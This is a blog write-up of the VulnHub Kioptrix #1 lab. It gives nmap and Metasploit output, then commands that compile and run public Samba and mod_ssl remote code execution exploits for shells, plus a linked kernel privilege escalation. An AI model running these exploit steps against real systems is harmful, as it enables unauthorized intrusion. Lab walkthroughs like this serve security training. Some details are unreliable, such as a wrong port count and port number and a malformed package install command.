---
title: "VulnHub - Kioptrix #1"
author: Nasrallah
description: ""
date: 2022-12-23 00:00:00 +0000
categories: [VulnHub]
tags: [vulnhub, linux, easy, ssl, smb, samba]
img_path: /assets/img/vulnhub/kioptrix1
---


---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Kioptrix level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/) from [VulnHub](https://www.vulnhub.com/).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 -p- {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

- -p-: Scan all ports.

```terminal
Nmap scan report for 192.168.56.4
Host is up (0.0026s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION 
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:                                                                 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods:     
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2 (RPC #100000)    
| rpcinfo:                                                                                                                                                    
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind                                                                                                                    
|   100000  2            111/udp   rpcbind                  
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status      
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2022-11-30T12:28:51+00:00; +4h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
|_http-title: 400 Bad Request
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:AF:BE:C3 (Oracle VirtualBox virtual NIC)

Host script results:
|_clock-skew: 4h59m58s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

We found 6 open ports:

 - 22/OpenSSH 2.9p2

 - 80/Apache/1.3.20

 - 139/netbios-ssn Samba smbd

 - 443/mod_ssl/2.8.4

## SMB

We found out from the scan that samba is running on port 139 but nmap couldn't detect a version, for that we're going to use the `metasploit` module `auxiliary/scanner/smb/smb_version`.

```bash
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_version
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> set rhosts 192.168.56.4
rhosts => 192.168.56.4
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> run

[*] 192.168.56.4:139      - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.56.4:139      -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.56.4:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >>
```

The version of the running Samba is 2.2.1a.

# **Foothold**

## Samba

Searching for vulnerabilities in Samba, i found this remote code execution [exploit](https://www.exploit-db.com/exploits/10)

![](1.png)

Let's download the exploit, compile and run it.

```bash
$ gcc exploit.c -o exploit

$ ./exploit -v 192.168.56.4 -b 0
```

![](2.png)

Great! We got a shell as root.

## SSL

On port 433, we have mod_ssl/2.8.4 which is also vulnerable to a remote code execution. We can find a working exploit [here](https://github.com/heltonWernik/OpenLuck).

After downloading the exploit, we need to download the ssl-dev library.

```bash
sudo apt install ssl-dev library
```

Now we compile the exploit with the following command:

```bash
gcc -o OpenFuck OpenFuck.c -lcrypto
```

And run the compiled exploit with this command:

```bash
./OpenFuck 0x6b 192.168.56.4 443 -c 40
```

![](3.png)

We got a shell as `apache`, which means it's privilege escalation time.

# **Privilege Escalation**

By running `uname -a`, we find that the version of linux running is `linux 2.4.7-10` and it's vulnerable to Local Privilege Escalation. Here is the [exploit](https://www.exploit-db.com/exploits/3)

Let's upload the exploit to the target, compile it and run it.

![](4.png)



---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
